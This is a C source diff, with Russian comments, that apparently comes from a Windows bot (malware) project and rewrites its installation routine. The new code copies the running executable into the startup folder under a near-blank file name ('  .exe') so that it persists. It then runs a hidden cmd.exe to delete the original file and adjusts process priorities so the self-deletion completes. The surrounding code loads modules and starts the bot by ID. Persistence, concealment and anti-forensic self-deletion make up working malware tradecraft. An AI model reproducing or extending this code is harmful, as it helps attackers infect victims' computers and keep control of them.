@@ -10,8 +10,8 @@
 #include "Core/Common.h"
 #include "Core/core.h"
 
-#pragma optimize( "", off )
-#pragma comment(linker, "/SUBSYSTEM:Windows /ENTRY:Main")
+//#pragma optimize( "", off )
+//#pragma comment(linker, "/SUBSYSTEM:Windows /ENTRY:Main")
 
 #define MEM_LIMIT 1024*1024
 #define MAX_MODULE_SIZE 1024*1024
@@ -26,22 +26,46 @@ static char idTask[MAX_PATH];
 static int (*start_module)(wchar_t* params) = NULL;
 
 static void install_bot() {
-	
-	char str_to_system[1024];
-	char path_bot[1024];
-	char username[1024];
 
-	DWORD bufCharCount = sizeof(username);
+	wchar_t path_newbot[1024];
+	wchar_t path_bot[1024];
+	wchar_t cmdParametrs[MAX_PATH];
 
-	GetModuleFileNameA(NULL, path_bot, sizeof(path_bot)/sizeof(path_bot[0]));
-	GetUserNameA(username, &bufCharCount);
-
-	sprintf(str_to_system, "copy %s \"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", path_bot, username);
-
-	system(str_to_system);
+	SHGetFolderPathW(NULL, CSIDL_ALTSTARTUP, NULL, 0, path_newbot);
+	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
+	wcscat(path_newbot, L"\\  .exe");
+	//если пути ботов - того который должен быть установлен и того кто запустился не совпадают
+	if (path_bot[15] != path_newbot[15] && path_bot[50] != path_newbot[50]) {
+		//копирование бота в папку автозагрузки
+		if (CopyFileW(path_bot, path_newbot, TRUE))
+		{
+			//выполняем самоудаление после успешного копирования
+			SHELLEXECUTEINFO sei; //инитаем структуры для процесса
+			wchar_t cmd_path[MAX_PATH]; //создаем переменную с будущим путем до cmd
+			GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH); //получаем путь до него
+			wsprintfW(cmdParametrs, L"/c del %ls > nul", path_bot); //создаем параметры для cmd под самоудаление
+			sei.cbSize = sizeof(sei);
+			sei.hwnd = 0;
+			sei.lpVerb = L"Open";
+			sei.lpFile = cmd_path; //путь до кмд
+			sei.lpParameters = cmdParametrs; //параметры запуска
+			sei.lpDirectory = 0;
+			sei.nShow = SW_HIDE;
+			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+			//зомбайн
+			if (ShellExecuteEx(&sei))
+			{
+				SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
+				SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+				SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+				SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, path_bot, 0);
+				ExitProcess(0);
+			}
+		}
+	}
 }
 
-int Main()
+int main()
 {	
 	start_bot(botId);
 
